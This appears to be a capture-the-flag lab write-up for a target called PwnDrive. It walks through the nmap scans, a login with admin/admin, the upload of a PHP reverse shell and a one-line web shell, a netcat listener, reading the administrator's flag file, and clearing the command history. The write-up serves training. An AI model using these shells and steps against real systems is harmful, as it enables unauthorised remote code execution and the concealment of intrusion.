1.  Reconnaissance

- Nmap -sn 10.150.150.0/24

Identified 10.150.150.11 as the active target for the next stage.

1.  Scanning

- sudo nmap -sC -sV -Pn -vv 10.150.150.11

Identified Port 80 running Apache httpd 2.4.46. This confirmed a web server was active.

1.  Gain Access

Opening the website http://101.150.150.11 and clicked on the Sign In button.

Tried some common usernames and passwords and successfully login with ‘admin’ as both username and password.

- /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/Shell.php

Copied the PHP web shell from the /usr/share/webshells/ directory to the Desktop to prepare for the upload on the website.

- Ip addr show tun0

Checked the tun0 IP address to verify the active OpenVPN connection. Then, configured the reverse shell payload by updating the $ip and $port variables to match the attacker’s listener settings.

Uploaded the configured shell.php payload to the PwnDrive web server.

1.  Maintain Access

- Nc -lvnp 1234

Started a Netcat listener on port 1234 to catch the reverse shell connection.

Opened http://10.150.150.11/upload/2/shell.php and cheked the nc -lvnp 1234 result to ensure it was listening and received the connection.

- &lt;?php echo "<pre&gt;" . shell_exec($\_REQUEST\['cmd'\]) . "&lt;/pre&gt;"; ?>

Created a simple PHP web shell (cmd.php) to allow Remote Code Execution (RCE) via the browser and saved into the Desktop. Then, upload it to the PwnDrive.

1.  Escalate Privileges

Executed the whoami command via the web shell to verify current privileges. The result confirmed nt authority\\system access, indicating fully administrative control over the target.

Use dir /s c:\\\*.txt to locate sensitive files. Identified FLAG1.txt on the Administrator’s Desktop.

- http://10.150.150.11/upload/2/cmd.php?cmd=type C:\\Users\\Administrator\\Desktop\\FLAG1.txt

Executed the type command to read the contents of the flag on the Administrator’s Desktop. Successfully captured FLAG1.txt, completing the exploitation.

1.  Clear Tracks

- history -c